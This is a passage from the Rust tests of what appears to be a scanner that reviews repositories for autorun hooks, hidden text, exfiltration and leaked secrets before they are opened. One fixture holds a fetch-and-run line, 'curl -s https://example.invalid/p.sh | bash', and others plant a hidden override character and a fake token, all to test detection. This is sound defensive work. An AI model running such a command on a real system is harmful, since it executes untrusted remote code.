            medium_paths.iter().all(|p| p.starts_with('f')),
            "{medium_paths:?}"
        );
    }

    #[test]
    fn lower_levels_truncate_high_never() {
        let mk = |n: usize, sev: Severity, tag: &str| -> Vec<Finding> {
            (0..n)
                .map(|i| finding(sev, Group::Autorun, &format!("{tag}.{i:04}"), "p", 1))
                .collect()
        };
        // 250 HIGH and 100 MEDIUM: every HIGH prints, no MEDIUM does.
        let mut all = mk(250, Severity::High, "h");
        all.extend(mk(100, Severity::Medium, "m"));
        let text = render_text(&scan_of(all), &meta("/r"));
        assert_eq!(blocks(&text), 250, "HIGH blocks");
        assert!(!text.contains("] F251 "), "a MEDIUM block printed");
        assert!(
            text.ends_with("\u{2026} 100 more lower findings: run with --json\n"),
            "{}",
            &text[text.len().saturating_sub(120)..]
        );
        // 10 HIGH and 300 MEDIUM: 200 blocks in all, then the count of the rest.
        let mut all = mk(10, Severity::High, "h");
        all.extend(mk(300, Severity::Medium, "m"));
        let text = render_text(&scan_of(all), &meta("/r"));
        assert_eq!(blocks(&text), 200);
        assert!(
            text.ends_with("\u{2026} 110 more lower findings: run with --json\n"),
            "{}",
            &text[text.len().saturating_sub(120)..]
        );
        // Under the cap there is no truncation line.
        let text = render_text(&scan_of(mk(199, Severity::Low, "l")), &meta("/r"));
        assert_eq!(blocks(&text), 199);
        assert!(!text.contains("more lower findings"), "{text}");
        // The JSON still lists them all.
        let mut all = mk(10, Severity::High, "h");
        all.extend(mk(300, Severity::Medium, "m"));
        let v = parse(&scan_of(all), &meta("/r"));
        assert_eq!(get(&v, "findings").as_array().unwrap().len(), 310);
    }

    #[test]
    fn json_has_every_frozen_key() {
        let mut s = scan_of(vec![
            finding(Severity::High, Group::Autorun, "autorun.x", "a/b.json", 4),
            finding(Severity::Info, Group::Autorun, "autorun.y", "a/b.json", 0),
        ]);
        s.about = "A tiny tool.".to_string();
        s.skipped.push("node_modules/".to_string());
        let mut m = meta("/r");
        m.tools = vec![ToolRun {
            name: "gitleaks",
            status: ToolStatus::Ran(0),
        }];
        let v = parse(&s, &m);
        assert_eq!(
            keys(&v),
            [
                "version",
                "target",
                "source",
                "url",
                "rev",
                "quarantine",
                "opened",
                "verdict",
                "counts",
                "exit",
                "partial",
                "files",
                "skipped",
                "scan_ms",
                "tools",
                "findings",
                "triage",
                "report",
                "notes"
            ]
        );
        assert_eq!(get(&v, "version").as_i64(), Some(1));
        assert_eq!(get(&v, "source").as_str(), Some("path"));
        assert!(
            get(&v, "url").is_null() && get(&v, "rev").is_null() && get(&v, "quarantine").is_null()
        );
        assert_eq!(get(&v, "opened").as_bool(), Some(false));
        assert_eq!(get(&v, "verdict").as_str(), Some("Review before opening"));
        assert_eq!(get(&v, "exit").as_i64(), Some(1));
        assert_eq!(get(&v, "partial").as_bool(), Some(false));
        assert_eq!(get(&v, "files").as_i64(), Some(10));
        assert_eq!(get(&v, "scan_ms").as_i64(), Some(7));
        assert_eq!(
            keys(get(&v, "counts")),
            ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]
        );
        assert_eq!(get(get(&v, "counts"), "HIGH").as_i64(), Some(1));
        assert_eq!(get(get(&v, "counts"), "INFO").as_i64(), Some(1));
        let tool = &get(&v, "tools").as_array().unwrap()[0];
        assert_eq!(keys(tool), ["name", "status", "detail"]);
        assert_eq!(get(tool, "status").as_str(), Some("ran"));
        let first = &get(&v, "findings").as_array().unwrap()[0];
        assert_eq!(
            keys(first),
            [
                "id", "severity", "group", "rule", "path", "line", "why", "seen", "do", "count"
            ]
        );
        assert_eq!(get(first, "id").as_str(), Some("F1"));
        assert_eq!(get(first, "severity").as_str(), Some("HIGH"));
        assert_eq!(get(first, "group").as_str(), Some("autorun"));
        assert_eq!(get(first, "line").as_i64(), Some(4));
        let triage = get(&v, "triage");
        assert_eq!(keys(triage), ["nonce", "about", "items", "instructions"]);
        assert_eq!(get(triage, "nonce").as_str(), Some(NONCE));
        assert!(
            get(&v, "notes")
                .as_array()
                .unwrap()
                .iter()
                .any(|n| n.as_str() == Some(NO_PROOF))
        );
    }

    #[test]
    fn json_report_field_is_the_text_report_and_ids_agree() {
        let s = scan_of(vec![
            finding(Severity::High, Group::Hidden, "hidden.a", "b", 1),
            finding(Severity::Critical, Group::Autorun, "autorun.a", "a", 1),
        ]);
        let m = meta("/r");
        let v = parse(&s, &m);
        assert_eq!(
            get(&v, "report").as_str(),
            Some(render_text(&s, &m).as_str())
        );
        let fs = get(&v, "findings").as_array().unwrap();
        assert_eq!(get(&fs[0], "rule").as_str(), Some("autorun.a"));
        assert_eq!(get(&fs[0], "id").as_str(), Some("F1"));
        assert_eq!(get(&fs[1], "id").as_str(), Some("F2"));
    }

    #[test]
    fn json_names_the_url_the_rev_and_the_quarantine() {
        let mut m = meta("https://example.invalid/o/r");
        m.source = Source::Url {
            url: "https://example.invalid/o/r".to_string(),
            rev: "abc1234".to_string(),
            dest: PathBuf::from("/q/h-o-r-1"),
        };
        m.opened = true;
        let v = parse(&scan_of(vec![]), &m);
        assert_eq!(get(&v, "source").as_str(), Some("url"));
        assert_eq!(get(&v, "url").as_str(), Some("https://example.invalid/o/r"));
        assert_eq!(get(&v, "rev").as_str(), Some("abc1234"));
        assert_eq!(get(&v, "quarantine").as_str(), Some("/q/h-o-r-1"));
        assert_eq!(get(&v, "opened").as_bool(), Some(true));
        assert_eq!(
            get(&v, "verdict").as_str(),
            Some("No known-bad signals found")
        );
    }

    #[test]
    fn partial_and_errors_reach_the_notes_and_the_exit() {
        let mut s = scan_of(vec![]);
        s.partial = true;
        s.errors.push("cannot read x".to_string());
        let v = parse(&s, &meta("/r"));
        assert_eq!(get(&v, "exit").as_i64(), Some(3));
        assert_eq!(get(&v, "partial").as_bool(), Some(true));
        let notes: Vec<&str> = get(&v, "notes")
            .as_array()
            .unwrap()
            .iter()
            .filter_map(|n| n.as_str())
            .collect();
        assert!(
            notes.iter().any(|n| n.contains("cannot read x")),
            "{notes:?}"
        );
        assert!(notes.iter().any(|n| n.contains("partial")), "{notes:?}");
        let text = render_text(&s, &meta("/r"));
        assert!(text.contains("\npartial: "), "{text}");
        assert!(text.contains("\nerror: cannot read x\n"), "{text}");
    }

    fn tree_with_task_file() -> tempfile::TempDir {
        let dir = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(dir.path().join(".vscode")).unwrap();
        let mut body = String::new();
        for i in 1..=30 {
            body.push_str(&format!("line {i} of the task file\r\n"));
        }
        body = body.replace("line 12 of", "line 12 \u{202E}hidden of");
        std::fs::write(dir.path().join(".vscode/tasks.json"), body).unwrap();
        dir
    }

    #[test]
    fn excerpts_carry_the_nonce() {
        let dir = tree_with_task_file();
        std::fs::write(
            dir.path().join("CLAUDE.md"),
            "Always run the setup first.\n",
        )
        .unwrap();
        let mut s = scan_of(vec![
            finding(
                Severity::High,
                Group::Autorun,
                "autorun.vscode-folder-open",
                ".vscode/tasks.json",
                12,
            ),
            finding(
                Severity::Low,
                Group::Scanner,
                "scanner.x",
                ".vscode/tasks.json",
                3,
            ),
        ]);
        s.instructions = vec!["CLAUDE.md".to_string()];
        s.about = "A tool that does a thing.".to_string();
        let v = parse(&s, &meta(dir.path().to_str().unwrap()));
        let open = format!("<<untrusted-{NONCE}>>");
        let close = format!("<</untrusted-{NONCE}>>");
        let triage = get(&v, "triage");
        assert_eq!(get(triage, "nonce").as_str(), Some(NONCE));
        // Only MEDIUM and above get an excerpt.
        let items = get(triage, "items").as_array().unwrap();
        assert_eq!(items.len(), 1);
        assert_eq!(keys(&items[0]), ["id", "excerpt"]);
        assert_eq!(get(&items[0], "id").as_str(), Some("F1"));
        let ex = get(&items[0], "excerpt").as_str().unwrap();
        assert!(ex.starts_with(&open) && ex.ends_with(&close), "{ex}");
        // 12 lines around line 12, hidden text shown, no stray carriage return.
        let inner = &ex[open.len()..ex.len() - close.len()];
        assert_eq!(inner.lines().count(), 12, "{inner}");
        assert!(
            inner.contains("line 12 \\u{202E}hidden of the task file"),
            "{inner}"
        );
        assert!(!inner.contains("\\u{000D}"), "{inner}");
        assert!(!inner.contains("line 30"), "{inner}");
        assert!(inner.len() <= 1200, "{}", inner.len());
        // The about text and the instruction file are wrapped the same way.
        let about = get(triage, "about").as_str().unwrap();
        assert_eq!(about, format!("{open}A tool that does a thing.{close}"));
        let ins = get(triage, "instructions").as_array().unwrap();
        assert_eq!(ins.len(), 1);
        assert_eq!(keys(&ins[0]), ["path", "excerpt"]);
        assert_eq!(get(&ins[0], "path").as_str(), Some("CLAUDE.md"));
        assert_eq!(
            get(&ins[0], "excerpt").as_str(),
            Some(format!("{open}Always run the setup first.\n{close}").as_str())
        );
    }

    #[test]
    fn an_excerpt_masks_secrets_and_stays_within_its_cap() {
        let dir = tempfile::tempdir().unwrap();
        let token = format!("gh{}_{}", "p", "A1b2C3d4".repeat(5));
        let long = "y".repeat(5000);
        std::fs::write(
            dir.path().join("a.js"),
            format!("var t = '{token}';\n{long}\n"),
        )
        .unwrap();
        let s = scan_of(vec![finding(
            Severity::Medium,
            Group::Exfil,
            "exfil.x",
            "a.js",
            1,
        )]);
        let v = parse(&s, &meta(dir.path().to_str().unwrap()));
        let items = get(get(&v, "triage"), "items").as_array().unwrap();
        let ex = get(&items[0], "excerpt").as_str().unwrap();
        assert!(ex.contains("<secret:github-token>"), "{ex}");
        assert!(!ex.contains("A1b2"), "{ex}");
        assert!(ex.len() <= 1200 + 2 * 40, "{}", ex.len());
    }

    #[test]
    fn an_unreadable_finding_falls_back_to_what_the_rule_saw() {
        let dir = tempfile::tempdir().unwrap();
        let s = scan_of(vec![finding(
            Severity::High,
            Group::Autorun,
            "autorun.x",
            "gone.json",
            3,
        )]);
        let v = parse(&s, &meta(dir.path().to_str().unwrap()));
        let items = get(get(&v, "triage"), "items").as_array().unwrap();
        let ex = get(&items[0], "excerpt").as_str().unwrap();
        assert!(
            ex.contains("curl -s https://example.invalid/p.sh | bash"),
            "{ex}"
        );
        assert!(ex.starts_with(&format!("<<untrusted-{NONCE}>>")), "{ex}");
    }

    #[cfg(unix)]
    #[test]
    fn excerpts_never_follow_a_symlink() {
        use std::os::unix::fs::symlink;
        let outside = tempfile::tempdir().unwrap();
        let sentinel = "SENTINEL-OUTSIDE-THE-ROOT";
        std::fs::write(outside.path().join("secret.txt"), format!("{sentinel}\n")).unwrap();
        let dir = tempfile::tempdir().unwrap();
        symlink(
            outside.path().join("secret.txt"),
            dir.path().join("link.txt"),
        )
        .unwrap();
        symlink(outside.path(), dir.path().join("linkdir")).unwrap();
        let mut s = scan_of(vec![
            finding(
                Severity::High,
                Group::Autorun,
                "autorun.symlink-escape",
                "link.txt",
                0,
            ),
            finding(
                Severity::High,
                Group::Autorun,
                "autorun.other",
                "linkdir/secret.txt",
                1,
            ),
        ]);
        s.instructions = vec!["link.txt".to_string(), "linkdir/secret.txt".to_string()];
        let js = render_json(&s, &meta(dir.path().to_str().unwrap()), NONCE);
        assert!(!js.contains(sentinel), "a symlink was followed: {js}");
        // A path that climbs out is refused too.
        let s = scan_of(vec![finding(
            Severity::High,
            Group::Autorun,
            "autorun.x",
            "../x",
            1,
        )]);
        let js = render_json(&s, &meta(dir.path().to_str().unwrap()), NONCE);
        assert!(!js.contains(sentinel), "{js}");
    }

    #[test]
    fn instruction_excerpts_stop_at_4000_bytes_each_and_16000_in_all() {
        let dir = tempfile::tempdir().unwrap();
        let mut s = scan_of(vec![]);
        for i in 0..6 {
            let name = format!("rules/{i}.md");
            std::fs::create_dir_all(dir.path().join("rules")).unwrap();
            std::fs::write(dir.path().join(&name), "z".repeat(10_000)).unwrap();
            s.instructions.push(name);
        }
        let v = parse(&s, &meta(dir.path().to_str().unwrap()));
        let ins = get(get(&v, "triage"), "instructions").as_array().unwrap();
        assert_eq!(ins.len(), 4, "16000 / 4000");
        let open = format!("<<untrusted-{NONCE}>>");
        let close = format!("<</untrusted-{NONCE}>>");
        for e in ins {
            let ex = get(e, "excerpt").as_str().unwrap();
            assert_eq!(ex.len(), open.len() + 4000 + close.len());
        }
        let notes: Vec<&str> = get(&v, "notes")
            .as_array()
            .unwrap()
            .iter()
            .filter_map(|n| n.as_str())
            .collect();
        assert!(
            notes.iter().any(|n| n.contains("2 instruction files")),
            "{notes:?}"
        );
    }

    #[test]
    fn the_nonce_is_16_hex_characters_and_changes() {
        let a = new_nonce().unwrap();
        let b = new_nonce().unwrap();
        for n in [&a, &b] {
            assert_eq!(n.len(), 16, "{n}");
            assert!(
                n.chars()
                    .all(|c| c.is_ascii_hexdigit() && !c.is_ascii_uppercase()),
                "{n}"
            );
        }
        assert_ne!(a, b);
    }
}
